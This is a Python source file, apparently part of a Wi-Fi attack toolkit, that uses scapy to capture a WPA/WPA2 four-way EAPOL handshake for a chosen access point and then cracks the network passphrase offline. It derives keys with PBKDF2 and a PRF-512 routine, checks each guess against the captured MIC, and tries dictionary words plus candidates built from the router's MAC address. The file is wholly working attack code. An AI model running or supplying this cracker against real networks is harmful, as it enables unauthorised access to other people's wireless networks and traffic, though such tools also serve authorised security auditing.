
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Raw
from pull import Pully
from pbkdf2 import PBKDF2
from screen import Display
from threading import Thread as threading
import binascii
import hmac
import sha
import hashlib
import sys
import re
import time
import string
try:
	from scapy.layers.dot11 import EAPOL
except ImportError:                                     # Support for new versions
	from scapy.layers.eap import EAPOL

try:
	xrange
except NameError:
	xrange = range

pull = Pully()

class PSK:

	__PSK = ''
	__NULL_ = '\x00'
	__PKE_ = "Pairwise key expansion"
	__CRACKED = (False, '')

	# Cracking Terms

	C_PTK__ = ''
	C_PASS__ = ''
	C_PMK__ = ''
	C_MIC__ = ''

	# Just a line break. Keep things tidy and clean.

	def __init__(self, eapol, essid, enc, dictionary, verbose, key=None):
		self.pkt_i = eapol[0]
		self.pkt_ii = eapol[1]
		self.pkt_iii = eapol[2]
		self.pkt_iv = eapol[3]
		self.key = key
		self.mic = binascii.hexlify(self.pkt_ii.getlayer(Raw).load)[154:186]
		self.essid = essid
		self.encryption = enc
		self.dict = dictionary
		self.verbose = verbose
		self.d_passes = self.create_d_passes(self.pkt_ii.getlayer(Dot11).addr2)
		self.organizer()

	def create_d_passes(self, mac):
		list__ = list()
		list__.append(mac.replace(':', '').lower()[:8])
		list__.append(mac.replace(':', '').upper()[:8])
		list__.append(mac.replace(':', '').lower()[4:])
		list__.append(mac.replace(':', '').upper()[4:])
		if re.search(r"[0-9]$", mac.replace(':', '').lower()[:8], re.I):
			for n in range(0, 10):
				if n != int(re.search(r"[0-9]$", mac.replace(':', '').lower()[:8], re.I).group()):
					list__.append(mac.replace(':', '').lower()[:8][:-1] + str(n))
					list__.append(mac.replace(':', '').upper()[:8][:-1] + str(n))
		if re.search(r"[0-9]$", mac.replace(':', '').lower()[4:], re.I):
			for n in range(0, 10):
				if n != int(re.search(r"[0-9]$", mac.replace(':', '').lower()[4:], re.I).group()):
					list__.append(mac.replace(':', '').lower()[4:][:-1] + str(n))
					list__.append(mac.replace(':', '').upper()[4:][:-1] + str(n))
		return list__

	def organizer(self):
		self.ap = binascii.a2b_hex(self.pkt_i.getlayer(Dot11).addr2.replace(':','').lower())
		self.cl = binascii.a2b_hex(self.pkt_i.getlayer(Dot11).addr1.replace(':','').lower())
		self.aNONCE = binascii.a2b_hex(binascii.hexlify(self.pkt_i.getlayer(Raw).load)[26:90])
		self.cNONCE = binascii.a2b_hex(binascii.hexlify(self.pkt_ii.getlayer(Raw).load)[26:90])
		self.key_data = min(self.ap, self.cl) + max(self.ap, self.cl) + min(self.aNONCE, self.cNONCE) + max(self.aNONCE, self.cNONCE)
		self.version = chr(self.pkt_ii.getlayer(EAPOL).version)
		self.type = chr(self.pkt_ii.getlayer(EAPOL).type)
		self.len = chr(self.pkt_ii.getlayer(EAPOL).len)

		self.payload = binascii.a2b_hex(binascii.hexlify(self.version\
					+self.type\
					+self.__NULL_\
					+self.len\
					+binascii.a2b_hex(binascii.hexlify(self.pkt_ii.getlayer(Raw).load)[:154])\
					+self.__NULL_*16\
					+binascii.a2b_hex(binascii.hexlify(self.pkt_ii.getlayer(Raw).load)[186:])))

		self.data = self.version\
					+self.type\
					+self.__NULL_\
					+self.len\
					+self.pkt_ii.getlayer(Raw).load

	def customPRF512(self, key, A, B):
		blen = 64
		i    = 0
		R    = ''
		while i<=((blen*8+159)/160):
			hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),sha)
			i+=1
			R = R+hmacsha1.digest()
		return R[:blen]

	def hash(self, pass__):
		pmk__ = PBKDF2(pass__, self.essid, 4096).read(32)
		ptk__ = self.customPRF512(pmk__, self.__PKE_, self.key_data)
		#if self.encryption == 'WPA':
		mic__ = hmac.new(ptk__[0:16], self.payload, hashlib.md5).digest()
		#elif self.encryption == 'WPA2':
		mic___ = hmac.new(ptk__[0:16], self.payload, hashlib.sha1).digest()
		if self.mic == binascii.hexlify(mic__):
			self.__CRACKED = (True, pass__)
			return (pmk__, ptk__, mic__)
		elif self.mic == binascii.hexlify(mic___)[:32]:
			self.__CRACKED = (True, pass__)
			return (pmk__, ptk__, mic___)
		else:
			return (pmk__, ptk__, mic__)

	def printing_pass(self, p_pass, c_pass):
		len_A, len_B = len(p_pass), len(c_pass)
		if len_A != 0:
			if len_A > len_B:
				return c_pass + ( " "*(len_A - len_B) )
			else:
				return c_pass
		else:
			return c_pass

	def pass_list(self):
		_list_ = []
		if self.key is None:
			file__ = open(self.dict, 'r')
			_list_ = self.d_passes+file__.readlines()
			file__.close()
		else:
			for key in self.key.split(','):
				_list_.append(key)
		return _list_

	def broot(self, screen=None):
		last_pass__, self._count_, pass_list = '', 0, []
		pass_list = self.pass_list()

		for pass__ in pass_list:

			self.C_PMK__, self.C_PTK__, self.C_MIC__ = self.hash(pass__.rstrip('\n'))
			self.C_PASS__, self._count_ = pass__.rstrip('\n'), self._count_+1

			pull.up('Current Password: %s' % self.printing_pass(last_pass__, pass__.rstrip('\n'))); last_pass__ = pass__.rstrip('\n')

			if self.__CRACKED[0] == True:
				return (self.__CRACKED[1], self.hexdump(self.C_PMK__), \
							 self.hexdump(self.C_PTK__), self.hexdump(self.C_MIC__))
			else:
				if not len(pass_list) == self._count_:
					pull.lineup()

		return (self.__CRACKED[1], '', '', '')

	def hexdump(self, src, length=16, sep='.'):
		DISPLAY = string.digits + string.letters + string.punctuation
		FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
		lines = []
		for c in xrange(0, len(src), length):
			chars = src[c:c+length]
			hex = ' '.join(["%02x" % ord(x) for x in chars])
			if len(hex) > 24:
				hex = "%s %s" % (hex[:24], hex[24:])
			printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
			lines.append("%08x:  %-*s  |%s|\n" % (c, length*3, hex, printable))
		return ''.join(lines)

class eAPoL:

	__EAPOLS = [0, 0, 0, 0]

	def __init__(self, bss):
		self.bssid = bss

	def check(self, pkt):
		fNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
		fMIC = "00000000000000000000000000000000"

		if pkt.haslayer(EAPOL):
			__sn = pkt[Dot11].addr2
			__rc = pkt[Dot11].addr1
			to_DS = pkt.getlayer(Dot11).FCfield & 0x1 !=0
			from_DS = pkt.getlayer(Dot11).FCfield & 0x2 !=0

			if __sn == self.bssid:
				tgt = __rc
			elif __rc == self.bssid:
				tgt = __sn
			else:
				return

			if from_DS == True:
				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
				mic = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
				if __sn == self.bssid and __rc == tgt and nonce != fNONCE and mic == fMIC:
					self.__EAPOLS[0] = pkt
				elif __sn == self.bssid and __rc == tgt and nonce != fNONCE and mic != fMIC:
					self.__EAPOLS[2] = pkt
			elif to_DS == True:
				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
				mic = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
				if __sn == tgt and __rc == self.bssid and nonce != fNONCE and mic != fMIC:
					self.__EAPOLS[1] = pkt
				elif __sn == tgt and __rc == self.bssid and nonce == fNONCE and mic != fMIC:
					self.__EAPOLS[3] = pkt

		if 0 not in self.__EAPOLS:
			return True
		else:
			return False

	def get_pols(self):
		return tuple(self.__EAPOLS)